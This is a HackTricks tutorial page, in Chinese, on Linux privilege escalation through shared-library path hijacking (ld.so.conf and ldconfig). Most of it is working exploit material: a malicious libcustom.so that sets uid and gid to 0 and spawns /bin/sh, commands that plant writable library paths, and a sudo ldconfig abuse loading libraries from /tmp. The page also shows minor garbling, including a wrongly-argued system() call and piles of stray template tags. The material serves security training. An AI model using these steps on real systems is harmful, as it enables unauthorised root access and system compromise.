# ld.so privesc exploit example

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

## 准备环境

在以下部分，您可以找到我们将用于准备环境的文件代码

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% endtab %}

{% tab title="libcustom.h" %}
```c
#include <stdio.h>

void vuln_func();
```
{% endtab %}

{% tab title="libcustom.c" %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% endtab %}
{% endtabs %}

1. **在**您的机器上在同一文件夹中**创建**这些文件
2. **编译**库：`gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **复制**`libcustom.so`到`/usr/lib`：`sudo cp libcustom.so /usr/lib`（root权限）
4. **编译**可执行文件：`gcc sharedvuln.c -o sharedvuln -lcustom`

### 检查环境

检查_libcustom.so_是否从_/usr/lib_被**加载**，并且您可以**执行**该二进制文件。
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

在这个场景中，我们假设**某人已经在 _/etc/ld.so.conf/_ 文件中创建了一个漏洞条目**：
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
易受攻击的文件夹是 _/home/ubuntu/lib_（我们有可写访问权限）。\
**下载并编译**以下代码到该路径：
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
现在我们已经**在错误配置的**路径中创建了恶意的 libcustom 库，我们需要等待**重启**或等待 root 用户执行 **`ldconfig`**（_如果您可以作为 **sudo** 执行此二进制文件，或者它具有 **suid 位**，您将能够自己执行它_）。

一旦发生这种情况，请**重新检查** `sharevuln` 可执行文件从哪里加载 `libcustom.so` 库：
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
如您所见，它是**从 `/home/ubuntu/lib` 加载的**，如果任何用户执行它，将会执行一个 shell：
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
注意，在这个例子中我们没有提升权限，但通过修改执行的命令并**等待root或其他特权用户执行易受攻击的二进制文件**，我们将能够提升权限。
{% endhint %}

### 其他错误配置 - 相同漏洞

在前面的例子中，我们伪造了一个错误配置，其中管理员**在`/etc/ld.so.conf.d/`中的配置文件内设置了一个非特权文件夹**。\
但是还有其他错误配置可能导致相同的漏洞，如果你在`/etc/ld.so.conf.d`中的某个**配置文件**、`/etc/ld.so.conf.d`文件夹或`/etc/ld.so.conf`文件中具有**写权限**，你可以配置相同的漏洞并加以利用。

## Exploit 2

**假设你对`ldconfig`具有sudo权限**。\
你可以指示`ldconfig`**从哪里加载配置文件**，因此我们可以利用它使`ldconfig`加载任意文件夹。\
所以，让我们创建加载"/tmp"所需的文件和文件夹：
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
现在，如**前面的漏洞**所示，**在 `/tmp` 中创建恶意库**。\
最后，让我们加载路径并检查二进制文件从哪里加载库：
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**正如您所看到的，拥有 `ldconfig` 的 sudo 权限，您可以利用相同的漏洞。**

{% hint style="info" %}
{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
